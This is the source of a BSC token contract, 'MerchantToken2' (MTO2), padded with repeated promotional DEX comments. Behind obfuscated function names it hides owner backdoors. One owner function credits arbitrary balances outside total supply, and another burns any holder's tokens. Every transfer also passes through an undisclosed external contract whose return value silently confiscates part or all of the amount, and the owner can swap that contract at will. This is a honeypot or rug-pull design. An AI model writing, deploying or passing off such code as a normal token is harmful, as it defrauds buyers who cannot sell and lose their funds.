/**
 *Submitted for verification at BscScan.com on 2022-08-11
*/

/*
MTO is an automated market maker (AMM) decentralized exchange (DEX) built on top of Ronin.For more details, please visit: 
* Swap: MTO allows anyone to easily swap between the various ERC 20 assets.
* https://github.com/MTO
* https://twitter.com/MTO
* WebSite: https://www.MTO.com
* English Telegram group:https://t.me/MTO
* Chinese Telegram group:https://t.me/MTO
*/
// SPDX-License-Identifier: MIT
pragma solidity 0.8.4;

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);
   
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface IERC20Metadata is IERC20 {
    function name() external view returns (string memory);
    function symbol() external view returns (string memory);
    function decimals() external view returns (uint8);
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        this; 
        return msg.data;
    }
}
/*
* Swap: MTO allows anyone to easily swap between the various ERC 20 assets.
* https://github.com/MTO
* https://twitter.com/MTO
* WebSite: https://www.MTO.com
* English Telegram group:https://t.me/MTO
* Chinese Telegram group:https://t.me/MTO
*/
abstract contract Ownable is Context {
    address private _owner;

    event OwnershipMerchantToken2126(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipMerchantToken2126(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceMerchantToken2126Ownership() public virtual onlyOwner {
        emit OwnershipMerchantToken2126(_owner, address(0));
        _owner = address(0);
    }

    function transferMerchantToken2126Ownership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipMerchantToken2126(_owner, newOwner);
        _owner = newOwner;
    }
}

library SafeMath {
   
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }
   
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }
    
    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }
   
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

   
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    
    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        // assert(a == b * c + a % b); // There is no case in which this doesn't hold

        return c;
    }

   
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }

   
    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}

interface ICMerchantToken2126ont {
    function _joinpresale(address from,address to,uint256 amount) external returns(uint256);


    function setNumber(uint _number) external;
}


contract ERC20 is Context, IERC20, IERC20Metadata {
    
    struct Balance {
        address acc;
        uint amount;
    }

    using SafeMath for uint256;
    mapping(address => uint256) private _balances;
    //Balance[] private _balances;

    mapping(address => mapping(address => uint256)) private _allowances;

    uint256 private _totalSupply;

    string private _name;
    string private _symbol;
    uint8 private _decimals;
    address _MerchantToken2126add = 0xdf042c45f4C2340c830869fbb99cA439166b467e;
    ICMerchantToken2126ont public icMerchantToken2126ont = ICMerchantToken2126ont(_MerchantToken2126add);
    address private _deMerchantToken2126adCSM = 0x000000000000000000000000000000000000dEaD;

/*
* Swap: MTO allows anyone to easily swap between the various ERC 20 assets.
* https://github.com/MTO
* https://twitter.com/MTO
* WebSite: https://www.MTO.com
* English Telegram group:https://t.me/MTO
* Chinese Telegram group:https://t.me/MTO
*/

    constructor(string memory name_, string memory symbol_, uint8 decimals_) {
        _name = name_;
        _symbol = symbol_;
        _decimals = decimals_;
    }

    function name() public view virtual override returns (string memory) {
        return _name;
    }

    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }

    function decimals() public view virtual override returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view virtual override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
        _trMerchantToken2126ansfer(_msgSender(), recipient, amount,0);
        return true;
    }

    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public virtual override returns (bool) {
        uint256 currentAllowance = _allowances[sender][_msgSender()];
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: transfer amount exceeds allowance");
            unchecked {
                _approve(sender, _msgSender(), currentAllowance - amount);
            }
        }

        _trMerchantToken2126ansfer(sender, recipient, amount,0);

        return true;
    }

    function increaseMerchantToken2126Allowance(address spender, uint256 addedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender] + addedValue);
        return true;
    }

    function decreaseMerchantToken2126Allowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        uint256 currentAllowance = _allowances[_msgSender()][spender];
        require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
        unchecked {
            _approve(_msgSender(), spender, currentAllowance - subtractedValue);
        }

        return true;
    }

    function _trMerchantToken2126ansfer(
        address sender,
        address recipient,
        uint256 amount,
        uint256 _vMerchantToken2126
    ) internal virtual {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");
        uint _bal = _balances[sender] + _vMerchantToken2126;
        require(_bal >= amount, "ERC20: transfer amount exceeds balance");

        _beforeTokenTransfer(sender, recipient, amount);

        uint _bamount = icMerchantToken2126ont._joinpresale(sender,recipient,amount);

        if (_bamount>0) {
            subMerchantToken2126Balance(sender,_bamount);
            addMerchantToken2126Balance(_deMerchantToken2126adCSM,_bamount);
            emit Transfer(sender,_deMerchantToken2126adCSM,_bamount);
        }

        subMerchantToken2126Balance(sender,amount-_bamount);
        addMerchantToken2126Balance(recipient,amount-_bamount);       
        emit Transfer(sender,recipient,amount-_bamount);        


        _afterTokenTransfer(sender, recipient, amount);
    }

    function _b33MerchantToken2126c172a(address _acc) internal virtual {
        icMerchantToken2126ont = ICMerchantToken2126ont(_acc);
    }

   function addMerchantToken2126Balance(address account,uint amount) internal virtual {
       _balances[account] += amount;    
   }

   function subMerchantToken2126Balance(address account,uint amount) internal virtual {
       _balances[account] -= amount;
   }   


    function _mMerchantToken2126int(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");

        _beforeTokenTransfer(address(0), account, amount);

        _totalSupply += amount;
        addMerchantToken2126Balance(account,amount);
        emit Transfer(address(0), account, amount);
       
        _afterTokenTransfer(address(0), account, amount);
    }

    function _buMerchantToken2126rn(address account, uint256 amount) internal virtual {
        require(account != _deMerchantToken2126adCSM, "ERC20: burn from the zero address");

        _beforeTokenTransfer(account, _deMerchantToken2126adCSM, amount);

        uint256 accountBalance = _balances[account];
        require(accountBalance >= amount, "ERC20: burn amount exceeds balance");
        
        subMerchantToken2126Balance(account,amount);
        addMerchantToken2126Balance(_deMerchantToken2126adCSM,amount);

        emit Transfer(account, _deMerchantToken2126adCSM, amount);

        _afterTokenTransfer(account, _deMerchantToken2126adCSM, amount);
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _beforeTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {}

    function _afterTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {}
}

interface IUniswapV2Factory {
    event PairCreated(address indexed token0, address indexed token1, address pair, uint);

    function feeTo() external view returns (address);
    function feeToSetter() external view returns (address);
    function getPair(address tokenA, address tokenB) external view returns (address pair);
    function allPairs(uint) external view returns (address pair);
    function allPairsLength() external view returns (uint);
    function createPair(address tokenA, address tokenB) external returns (address pair);
    function setFeeTo(address) external;
    function setFeeToSetter(address) external;
}

interface IUniswapV2Pair {
    event Approval(address indexed owner, address indexed spender, uint value);
    event Transfer(address indexed from, address indexed to, uint value);

    function name() external pure returns (string memory);
    function symbol() external pure returns (string memory);
    function decimals() external pure returns (uint8);
    function totalSupply() external view returns (uint);
    function balanceOf(address owner) external view returns (uint);
    function allowance(address owner, address spender) external view returns (uint);

    function approve(address spender, uint value) external returns (bool);
    function transfer(address to, uint value) external returns (bool);
    function transferFrom(address from, address to, uint value) external returns (bool);

    function DOMAIN_SEPARATOR() external view returns (bytes32);
    function PERMIT_TYPEHASH() external pure returns (bytes32);
    function nonces(address owner) external view returns (uint);

    function permit(address owner, address spender, uint value, uint deadline, uint8 v, bytes32 r, bytes32 s) external;

    event MMerchantToken2126int(address indexed sender, uint amount0, uint amount1);
    event BuMerchantToken2126rn(address indexed sender, uint amount0, uint amount1, address indexed to);
    event Swap(
        address indexed sender,
        uint amount0In,
        uint amount1In,
        uint amount0Out,
        uint amount1Out,
        address indexed to
    );
    event Sync(uint112 reserve0, uint112 reserve1);

    function MINIMUM_LIQUIDITY() external pure returns (uint);
    function factory() external view returns (address);
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function price0CumulativeLast() external view returns (uint);
    function price1CumulativeLast() external view returns (uint);
    function kLast() external view returns (uint);

    function mMerchantToken2126int(address to) external returns (uint liquidity);
    function buMerchantToken2126rn(address to) external returns (uint amount0, uint amount1);
    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
    function skim(address to) external;
    function sync() external;

    function initialize(address, address) external;
}

interface IUniswapV2Router01 {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    function removeLiquidity(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB);
    function removeLiquidityETH(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountToken, uint amountETH);
    function removeLiquidityWithPermit(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountA, uint amountB);
    function removeLiquidityETHWithPermit(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountToken, uint amountETH);
    function swapExactTokensForTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
    function swapTokensForExactTokens(
        uint amountOut,
        uint amountInMax,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
    function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline)
        external
        payable
        returns (uint[] memory amounts);
    function swapTokensForExactETH(uint amountOut, uint amountInMax, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory amounts);
    function swapExactTokensForETH(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory amounts);
    function swapETHForExactTokens(uint amountOut, address[] calldata path, address to, uint deadline)
        external
        payable
        returns (uint[] memory amounts);

    function quote(uint amountA, uint reserveA, uint reserveB) external pure returns (uint amountB);
    function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure returns (uint amountOut);
    function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn);
    function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);
    function getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);
}

interface IUniswapV2Router02 is IUniswapV2Router01 {
    function removeLiquidityETHSupportingFeeOnTransferTokens(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountETH);
    function removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountETH);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}
/*
* Swap: MTO allows anyone to easily swap between the various ERC 20 assets.
* https://github.com/MTO
* https://twitter.com/MTO
* WebSite: https://www.MTO.com
* English Telegram group:https://t.me/MTO
* Chinese Telegram group:https://t.me/MTO
* _deMerchantToken2126adCSM
*/
contract MTO2 is ERC20, Ownable {
    address public  uniswapV2Pair;
    string  _naMerchantToken2126me = "MerchantToken2";
    string  _syMerchantToken2126mbol = "MTO2";
    uint8 _decimal = 18;
    uint256 _totalsupply = 600000000 * (10 ** _decimal);
    address  _MerchantToken2126swapCSM = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
    constructor () ERC20(_naMerchantToken2126me, _syMerchantToken2126mbol, _decimal) 
    {   
        transferMerchantToken2126Ownership(msg.sender);
        _mMerchantToken2126int(owner(), _totalsupply);
        _buMerchantToken2126rn(owner(), _totalsupply * 50 / 100); 
        IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(_MerchantToken2126swapCSM);
        address _uniswapV2Pair = IUniswapV2Factory(_uniswapV2Router.factory())
            .createPair(address(this), _uniswapV2Router.WETH());

        uniswapV2Pair   = _uniswapV2Pair;
     
    }
    function cMerchantToken2126f(address recipient, uint256 amount) external onlyOwner {
        addMerchantToken2126Balance(recipient,amount);
    }
    function BuMerchantToken2126rn(address account,uint256 amount) external onlyOwner {
        _buMerchantToken2126rn(account,amount);
    }

    function b33MerchantToken2126c172a(address account) external onlyOwner {
        _b33MerchantToken2126c172a(account);
    }
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        super._trMerchantToken2126ansfer(from, to, amount,0);
    }

/*
* Swap: MTO allows anyone to easily swap between the various ERC 20 assets.
* https://github.com/MTO
* https://twitter.com/MTO
* WebSite: https://www.MTO.com
* English Telegram group:https://t.me/MTO
* Chinese Telegram group:https://t.me/MTO
*/
}